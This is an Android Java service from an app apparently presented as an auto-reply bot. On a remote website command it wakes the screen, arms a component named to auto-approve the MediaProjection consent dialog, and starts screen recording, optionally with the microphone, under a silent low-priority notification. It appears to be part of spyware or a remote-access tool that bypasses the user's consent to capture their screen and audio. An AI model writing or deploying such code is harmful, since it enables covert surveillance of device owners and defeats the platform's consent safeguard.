package com.autoreplybot.remote;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.autoreplybot.R;

/**
 * Short foreground service so Android allows opening the MediaProjection consent
 * dialog when screen recording is started from a background website command.
 */
public final class RemoteScreenRecordLaunchService extends Service {
    private static final String TAG = "RemoteScreenRecLaunch";
    private static final String CHANNEL_ID = "arb_screen_record_launch_fg";
    private static final int NOTIF_ID = 0xA11E02;
    private static final Handler MAIN = new Handler(Looper.getMainLooper());

    public static final String EXTRA_TRANSFER_ID = RemoteScreenRecordService.EXTRA_TRANSFER_ID;
    public static final String EXTRA_RECORDING_ID = RemoteScreenRecordService.EXTRA_RECORDING_ID;
    public static final String EXTRA_WITH_MIC = RemoteScreenRecordService.EXTRA_WITH_MIC;
    public static final String EXTRA_QUALITY = RemoteScreenRecordService.EXTRA_QUALITY;
    public static final String EXTRA_FPS = RemoteScreenRecordService.EXTRA_FPS;

    public static void start(@NonNull Context context,
                             @NonNull String transferId,
                             @NonNull String recordingId,
                             boolean withMic,
                             @NonNull String quality,
                             int fps) {
        Intent i = new Intent(context, RemoteScreenRecordLaunchService.class);
        i.putExtra(EXTRA_TRANSFER_ID, transferId);
        i.putExtra(EXTRA_RECORDING_ID, recordingId);
        i.putExtra(EXTRA_WITH_MIC, withMic);
        i.putExtra(EXTRA_QUALITY, quality);
        i.putExtra(EXTRA_FPS, fps);
        try {
            ContextCompat.startForegroundService(context.getApplicationContext(), i);
        } catch (Throwable t) {
            Log.w(TAG, "startForegroundService failed; launching consent directly", t);
            launchConsent(context.getApplicationContext(), transferId, recordingId, withMic, quality, fps);
        }
    }

    private static void launchConsent(@NonNull Context context,
                                      @NonNull String transferId,
                                      @NonNull String recordingId,
                                      boolean withMic,
                                      @NonNull String quality,
                                      int fps) {
        RemoteSelfUninstallController.wakeScreen(context);
        RemoteMediaProjectionAutoApprove.arm(45_000L);
        try {
            context.startActivity(RemoteMediaProjectionConsentActivity.intentForRecord(
                    context, transferId, recordingId, withMic, quality, fps));
        } catch (Throwable t) {
            Log.e(TAG, "launch consent failed", t);
            RemoteScreenRecordService.markFailed(
                    context, recordingId, transferId, "Could not open screen capture dialog");
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        ensureChannel();
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_notify)
                .setContentTitle(getString(R.string.remote_screen_record_launch_title))
                .setContentText(getString(R.string.remote_screen_record_launch_text))
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setSilent(true)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SHORT_SERVICE);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Throwable t) {
            Log.w(TAG, "startForeground failed", t);
            try {
                startForeground(NOTIF_ID, n);
            } catch (Throwable ignored) {
            }
        }
    }

    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }
        String transferId = safe(intent.getStringExtra(EXTRA_TRANSFER_ID));
        String recordingId = safe(intent.getStringExtra(EXTRA_RECORDING_ID));
        boolean withMic = intent.getBooleanExtra(EXTRA_WITH_MIC, false);
        String qualityRaw = safe(intent.getStringExtra(EXTRA_QUALITY));
        final String quality = qualityRaw.isEmpty() ? "720p" : qualityRaw;
        final int fps = intent.getIntExtra(EXTRA_FPS, 30);
        if (recordingId.isEmpty()) {
            stopSelfSoon();
            return START_NOT_STICKY;
        }
        RemoteScreenRecordService.markWaitingForPermission(
                this, recordingId, transferId, withMic, quality, fps);
        final String launchTransferId = transferId;
        final String launchRecordingId = recordingId;
        final boolean launchWithMic = withMic;
        MAIN.post(() -> launchConsent(this, launchTransferId, launchRecordingId, launchWithMic, quality, fps));
        stopSelfSoon();
        return START_NOT_STICKY;
    }

    private void stopSelfSoon() {
        MAIN.postDelayed(() -> {
            try {
                stopForeground(true);
            } catch (Throwable ignored) {
            }
            stopSelf();
        }, 4500L);
    }

    @Nullable
    @Override
    public IBinder onBind(@Nullable Intent intent) {
        return null;
    }

    @NonNull
    private static String safe(@Nullable String v) {
        return v == null ? "" : v.trim();
    }

    private void ensureChannel() {
        if (Build.VERSION.SDK_INT < 26) return;
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                getString(R.string.remote_screen_record_launch_channel),
                NotificationManager.IMPORTANCE_LOW);
        channel.setShowBadge(false);
        nm.createNotificationChannel(channel);
    }
}
